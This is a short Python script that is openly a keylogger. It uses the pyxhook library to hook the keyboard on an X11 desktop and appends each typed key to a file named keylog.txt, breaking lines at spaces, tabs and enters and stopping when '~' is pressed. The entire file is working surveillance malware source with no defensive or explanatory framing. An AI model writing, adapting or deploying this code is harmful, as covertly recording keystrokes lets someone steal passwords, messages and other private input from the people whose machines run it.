# noinspection PyUnresolvedReferences

import  pyxhook







#----------------------Functions----------------------

def OnKeyPress(event):

    #write on the file when the button that was pressed was  not ctrl,space,..etc
    
    if event.Ascii > 32 and event.Ascii != 126:
        file.write( event.Key)



    #if space,tab,enter is pressed then change line

    if event.Ascii == 32 or event.Ascii == 9 or event.Ascii == 13:

        file.write("\n")
        
        #if  ~ or Shift + ` was pressed close the keylogger
        
    elif event.Ascii == 126:
        file.close()
        hook.cancel()




#----------------------End of Functions----------------------




#creat a file 

file = open('keylog.txt','a')

#instantiate HookManager class

hook = pyxhook.HookManager()

#listen to key strokes when a button is pressed

hook.KeyDown = OnKeyPress

#hook the keyboard

hook.HookKeyboard()

#start the keylogger session

hook.start()

